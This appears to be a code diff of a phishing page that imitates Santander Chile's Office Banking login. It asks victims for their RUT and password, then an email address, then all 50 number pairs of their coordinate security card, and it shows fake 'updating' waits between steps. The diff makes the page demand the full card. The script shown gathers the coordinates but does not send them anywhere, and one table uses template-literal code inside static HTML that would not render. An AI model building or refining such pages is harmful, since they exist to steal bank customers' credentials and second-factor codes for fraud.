@@ -154,50 +154,38 @@
   <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="2" aria-label="Slide 3"></button>
 </div>
 
-<!-- Offcanvas con tu flujo original -->
-<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin" aria-labelledby="offcanvasLoginLabel">
+<!-- OFFCANVAS LOGIN -->
+<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin">
   <div class="offcanvas-header" style="padding-top:40px; padding-bottom:20px;">
-    <!-- Logos arriba, pegados al borde -->
     <div class="d-flex justify-content-center align-items-center">
-  <img src="/logo-office-banking.svg" alt="Office Banking" class="logo-ob me-3">
-  <img src="/LogoSantander.png" alt="Logo Santander" class="logo-santander">
-</div>
-    <!-- Botón X en rojo a la derecha -->
-    <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"
-            style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);">
-    </button>
+      <img src="/logo-office-banking.svg" class="logo-ob me-3">
+      <img src="/LogoSantander.png" class="logo-santander">
+    </div>
+
+    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"
+            style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);"></button>
   </div>
 
-
   <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
-  <!-- Encabezado único -->
-  <h5 class="text-center mb-4">
-    Bienvenido a Office Banking
-  </h5>
+    <h5 class="text-center mb-4">Bienvenido a Office Banking</h5>
 
-  <div class="login-box">
-        <!-- Formulario inicial -->
-        <form id="loginForm">
-          <label for="rut">RUT</label>
-         <div class="position-relative">
-      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right: 40px;">
-      <!-- Botón X para limpiar -->
-      <span class="clear-input" onclick="document.getElementById('rut').value=''"></span>
-    </div>
-<label for="passwd">Contraseña</label>
-<div class="position-relative">
-  <input 
-    type="password" 
-    id="passwd" 
-    name="passwd" 
-    required 
-    class="form-control" 
-    style="padding-right: 80px;">
-  <!-- Botón X para limpiar -->
-  <span class="clear-input" onclick="document.getElementById('passwd').value=''"></span>
-  <!-- Ojo cargado desde archivo SVG -->
-  <img id="togglePasswd" src="eye.svg" alt="Mostrar contraseña" class="icon-eye">
-</div>
+    <div class="login-box">
+
+      <!-- LOGIN -->
+      <form id="loginForm">
+        <label for="rut">RUT</label>
+        <div class="position-relative">
+          <input type="text" id="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right:40px;">
+          <span class="clear-input" onclick="rut.value=''"></span>
+        </div>
+
+        <label for="passwd">Contraseña</label>
+        <div class="position-relative">
+          <input type="password" id="passwd" required class="form-control" style="padding-right:80px;">
+          <span class="clear-input" onclick="passwd.value=''"></span>
+          <img id="togglePasswd" src="eye.svg" class="icon-eye">
+        </div>
+
         <button type="submit" class="btn-red w-100">Aceptar</button>
         <div class="options">
           <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
@@ -206,46 +194,30 @@
 
       <div id="resultado"></div>
 
-      <!-- PANTALLA ESPERA -->
+      <!-- ESPERA -->
       <div id="pantallaEspera" class="hidden">
         <h2>Estamos actualizando la información, por favor espera...</h2>
         <div class="spinner"></div>
       </div>
 
-      <!-- FORMULARIO CORREO -->
+      <!-- CORREO -->
       <div id="formCorreo" class="hidden">
         <h2>Necesitamos actualizar tu correo electrónico</h2>
         <input type="email" id="correo" placeholder="Ingresa tu correo">
         <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
       </div>
 
-      <!-- SELECCIÓN COORDENADAS / PASS -->
-      <div id="pantallaSeleccion" class="hidden" style="text-align:center; padding:20px;">
-        <h2 style="font-size:18px; margin-bottom:20px;">
-          ¿Aún utilizas Tarjeta de Coordenadas?
-        </h2>
-
-        <button class="btn-red w-100 mb-3" onclick="seleccionarCoordenadas()">
-          Tengo Tarjeta de Coordenadas
-        </button>
-
-        <button class="btn-red w-100" onclick="seleccionarPass()">
-          Tengo Santander Pass
-        </button>
-      </div>
-
-      <!-- PANTALLA COORDENADAS -->
+      <!-- COORDENADAS (50 PARES) -->
       <div id="pantallaCoordenadas" class="hidden" style="padding:20px;">
-
         <div class="text-center mb-3">
-          <img src="/logo-office-banking.svg" alt="Office Banking" style="height:50px;">
+          <img src="/logo-office-banking.svg" style="height:50px;">
         </div>
 
         <h2 class="text-center" style="font-size:18px; margin-bottom:20px;">
-          Si aún mantienes tu <strong>Tarjeta de Coordenadas</strong>, es necesario actualizarla para evitar el bloqueo de la misma.
+          Ingresa los <strong>50 pares numéricos</strong> de tu Tarjeta de Coordenadas.
         </h2>
 
-        <div class="table-responsive" style="overflow-x:auto;">
+        <div class="table-responsive">
           <table class="table table-bordered text-center" style="min-width:600px;">
             <thead>
               <tr>
@@ -255,87 +227,22 @@
               </tr>
             </thead>
             <tbody>
-
-              <!-- FILA 1 -->
-              <tr><th>1</th>
-                <td><input maxlength="2" id="coord-A1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I1" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J1" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 2 -->
-              <tr><th>2</th>
-                <td><input maxlength="2" id="coord-A2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I2" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J2" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 3 -->
-              <tr><th>3</th>
-                <td><input maxlength="2" id="coord-A3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I3" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J3" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 4 -->
-              <tr><th>4</th>
-                <td><input maxlength="2" id="coord-A4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I4" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J4" class="coord-input"></td>
-              </tr>
-
-              <!-- FILA 5 -->
-              <tr><th>5</th>
-                <td><input maxlength="2" id="coord-A5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-B5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-C5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-D5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-E5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-F5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-G5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-H5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-I5" class="coord-input"></td>
-                <td><input maxlength="2" id="coord-J5" class="coord-input"></td>
-              </tr>
-
+              <!-- 5 FILAS x 10 COLUMNAS = 50 CAMPOS -->
+              ${[1,2,3,4,5].map(num => `
+                <tr><th>${num}</th>
+                  ${["A","B","C","D","E","F","G","H","I","J"].map(col => `
+                    <td><input maxlength="2" id="coord-${col}${num}" class="coord-input"></td>
+                  `).join("")}
+                </tr>
+              `).join("")}
             </tbody>
           </table>
         </div>
 
-        <button class="btn-red w-100 mt-3" onclick="enviarCoordenadas()">
-          Ingresar
-        </button>
+        <button class="btn-red w-100 mt-3" onclick="enviarCoordenadas()">Ingresar</button>
       </div>
 
-      <!-- PANTALLA PRODUCTOS -->
+      <!-- PRODUCTOS -->
       <div id="pantallaProductos" class="hidden">
         <h2>Estamos evaluando la mejor alternativa posible</h2>
         <button class="btn-red" onclick="continuarProductos()">Continuar</button>
@@ -344,3 +251,111 @@
     </div>
   </div>
 </div>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+/* OJO */
+const passwdInput = document.getElementById("passwd");
+const togglePasswd = document.getElementById("togglePasswd");
+togglePasswd.onclick = () => {
+  passwdInput.type = passwdInput.type === "password" ? "text" : "password";
+  togglePasswd.src = passwdInput.type === "password" ? "eye.svg" : "eye-slash.svg";
+};
+
+/* FORMATEO RUT */
+function formatearRUT(valor){
+  valor = valor.replace(/\./g,"").replace(/-/g,"");
+  if(valor.length===0) return "";
+  let dv = valor.slice(-1);
+  let cuerpo = valor.slice(0,-1);
+  return cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g,".") + "-" + dv;
+}
+rut.addEventListener("input", e => {
+  let v = e.target.value.replace(/[^0-9kK]/g,"");
+  e.target.value = formatearRUT(v);
+});
+
+/* VALIDAR RUT */
+function validarRut(r){
+  r = r.replace(/\./g,"").replace(/-/g,"").toUpperCase();
+  if(r.length<2) return false;
+  let c = r.slice(0,-1), dv = r.slice(-1);
+  let s=0,m=2;
+  for(let i=c.length-1;i>=0;i--){
+    s += parseInt(c[i])*m;
+    m = m<7 ? m+1 : 2;
+  }
+  let e = 11-(s%11);
+  e = e===11?"0":e===10?"K":e.toString();
+  return dv===e;
+}
+
+/* LOGIN */
+loginForm.addEventListener("submit", async e=>{
+  e.preventDefault();
+  if(!validarRut(rut.value)){
+    resultado.innerText="❌ RUT inválido";
+    return;
+  }
+
+  pantallaEspera.classList.remove("hidden");
+  loginForm.style.display="none";
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    formCorreo.classList.remove("hidden");
+  },45000);
+});
+
+/* CORREO */
+async function enviarCorreo(){
+  formCorreo.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    pantallaCoordenadas.classList.remove("hidden");
+  },15000);
+}
+
+/* COORDENADAS */
+function enviarCoordenadas(){
+  let coords={};
+  const letras=["A","B","C","D","E","F","G","H","I","J"];
+
+  for(let f=1;f<=5;f++){
+    for(let c of letras){
+      let id=`coord-${c}${f}`;
+      let v=document.getElementById(id).value.trim();
+      if(v.length!==2){
+        alert(`El valor ${c}${f} debe tener 2 dígitos.`);
+        return;
+      }
+      coords[`${c}${f}`]=v;
+    }
+  }
+
+  pantallaCoordenadas.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    pantallaProductos.classList.remove("hidden");
+  },15000);
+}
+
+/* PRODUCTOS */
+function continuarProductos(){
+  pantallaProductos.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    window.location.href="productos.html";
+  },15000);
+}
+</script>
+
+</body>
+</html>
